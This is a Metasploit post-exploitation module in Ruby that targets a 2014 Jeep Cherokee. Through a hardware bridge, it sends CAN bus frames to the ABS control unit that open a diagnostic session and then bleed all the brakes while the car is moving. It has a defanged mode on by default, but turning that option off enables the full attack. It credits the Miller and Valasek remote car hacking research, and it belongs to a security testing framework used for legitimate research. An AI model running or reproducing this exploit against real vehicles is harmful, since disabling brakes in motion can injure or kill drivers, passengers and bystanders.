##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '2014 Jeep Cherokee Bleed Brakes',
        'Description' => %q{
          This module will bleed all the brakes on the 2014 Jeep Cherokee while the car is moving.
          This has the result that the brakes will not work during this time and has significant
          safety issues, even if it only works if you are driving slowly.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Charlie Miller', # Original Research
          'Chris Valasek', # Original Research
          'Jay Turla' # Metasploit Module
        ],
        'References' => [
          ['URL', 'https://ioactive.com/wp-content/uploads/2018/05/IOActive_Remote_Car_Hacking-1.pdf'],
          ['URL', 'http://www.illmatics.com/Remote%20Car%20Hacking.pdf']
        ],
        'Platform' => ['hardware'],
        'SessionTypes' => ['hwbridge'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [PHYSICAL_EFFECTS],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('CANBUS', [false, 'CAN Bus to perform scan on, defaults to connected bus', nil])
    ])

    register_advanced_options([
      OptBool.new('DefangedMode', [true, 'Run in defanged mode', true])
    ])
  end

  def run
    if datastore['DefangedMode']
      print_error('Running in defanged mode')
      print_error('Set this to false to disable defanged mode and enable module functionality.')
      return
    end

    unless client.automotive
      print_error('The hwbridge requires a functional automotive extention')
      return
    end
    print_status('Starting a diagnostic session with the ABS ECU...')
    client.automotive.cansend(datastore['CANBUS'], '18DA28F1', '0210030000000000')
    print_status('-- Bleeding all the brakes at maximum --')
    client.automotive.cansend(datastore['CANBUS'], '18DA28F1', '10112F5ABF036464')
    client.automotive.cansend(datastore['CANBUS'], '18DA28F1', '6464646464646464')
    client.automotive.cansend(datastore['CANBUS'], '18DA28F1', '6464640000000000')
  end
end
